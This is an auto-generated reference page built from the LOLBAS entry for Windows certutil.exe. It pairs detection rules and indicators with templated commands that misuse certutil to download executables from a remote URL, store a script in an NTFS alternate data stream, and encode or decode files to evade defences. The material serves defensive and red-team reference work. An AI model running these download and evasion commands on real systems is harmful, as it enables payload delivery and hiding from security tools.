---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Certutil.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `certutil.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certutil.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Certutil.exe](../../tools/windows/certutil.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | certutil.exe |
| name | Certutil.exe |
| type | tool |
| source | lolbas |
| url | https://twitter.com/Moriarty_Meng/status/984380793383370752 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@mattifestation'
  Person: Matt Graeber
- Handle: '@Moriarty_Meng'
  Person: Moriarty
- Handle: '@egre55'
  Person: egre55
- Person: Lior Adar
- Handle: '@hexacorn'
  Person: Adam
- Handle: '@SomeTestLeper'
  Person: SomeTestLeper
Author: Oddvar Moe
Commands:
- Category: Download
  Command: certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
  Description: Download and save an executable to disk in the current folder.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Usecase: Download file from Internet
- Category: Download
  Command: certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
  Description: Download and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`
    when not.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Usecase: Download file from Internet
- Category: ADS
  Command: certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
  Description: Download and save a .ps1 file to an Alternate Data Stream (ADS).
  MitreID: T1564.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Usecase: Download file from Internet and save it in an NTFS Alternate Data Stream
- Category: Download
  Command: certutil.exe -URL {REMOTEURL:.exe}
  Description: Download and save an executable to `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Application: GUI
  Usecase: Download file from Internet
- Category: Encode
  Command: certutil -encode {PATH} {PATH:.base64}
  Description: Command to encode a file using Base64
  MitreID: T1027.013
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Usecase: Encode files to evade defensive measures
- Category: Decode
  Command: certutil -decode {PATH:.base64} {PATH}
  Description: Command to decode a Base64 encoded file.
  MitreID: T1140
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Usecase: Decode files to evade defensive measures
- Category: Decode
  Command: certutil -decodehex {PATH:.hex} {PATH}
  Description: Command to decode a hexadecimal-encoded file.
  MitreID: T1140
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Usecase: Decode files to evade defensive measures
Created: 2018-05-25
Description: Windows binary used for handling certificates
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_decode.yml
- Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml
- IOC: Certutil.exe creating new files on disk
- IOC: Useragent Microsoft-CryptoAPI/10.0
- IOC: Useragent CertUtil URL Agent
Full_Path:
- Path: C:\Windows\System32\certutil.exe
- Path: C:\Windows\SysWOW64\certutil.exe
Name: Certutil.exe
Resources:
- Link: https://twitter.com/Moriarty_Meng/status/984380793383370752
- Link: https://twitter.com/mattifestation/status/620107926288515072
- Link: https://twitter.com/egre55/status/1087685529016193025
- Link: https://www.hexacorn.com/blog/2020/08/23/certutil-one-more-gui-lolbin/
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certutil.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml
```

```text
IOC: Certutil.exe creating new files on disk
```

```text
IOC: Useragent CertUtil URL Agent
```

```text
IOC: Useragent Microsoft-CryptoAPI/10.0
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_decode.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml
```

```text
Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml
```

```text
Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml
```

```text
Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_decode.yml
- Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml
- IOC: Certutil.exe creating new files on disk
- IOC: Useragent Microsoft-CryptoAPI/10.0
- IOC: Useragent CertUtil URL Agent
```
